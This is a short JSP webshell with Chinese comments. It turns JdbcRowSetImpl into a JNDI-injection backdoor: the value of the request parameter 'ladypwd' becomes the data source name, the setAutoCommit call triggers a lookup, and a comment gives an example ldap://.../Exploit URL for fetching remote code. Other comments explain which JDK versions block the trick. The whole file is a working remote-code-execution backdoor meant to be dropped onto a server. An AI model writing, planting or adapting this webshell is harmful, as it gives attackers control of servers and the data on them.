<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
利用JdbcRowSetImpl进行JNDI注入，从而实现JSP Webshell

PS: 经测试，该方式的实现，还是会受到JDK版本的限制。
--%>
<%
    //该设置其实无效，当服务端用的是JDK8u191及以上版本时，Tomcat其实在启动时会将
    // 全局属性"com.sun.jndi.ldap.object.trustURLCodebase" 设置为false，
    // 并赋值给一个静态变量 trustURLCodebase， 当JNDI注入->lookup()方法执行的过程中,
    // 会对静态变量 trustURLCodebase 的值进行判断。
    //因此，这里对全局属性"com.sun.jndi.ldap.object.trustURLCodebase"进行赋值并不能改变
    // 静态变量 trustURLCodebase 的值。
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
    jdbcRowSet.setDataSourceName(request.getParameter("ladypwd"));//ldap://127.0.0.1:8384/Exploit
    try {
        jdbcRowSet.setAutoCommit(true);
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>


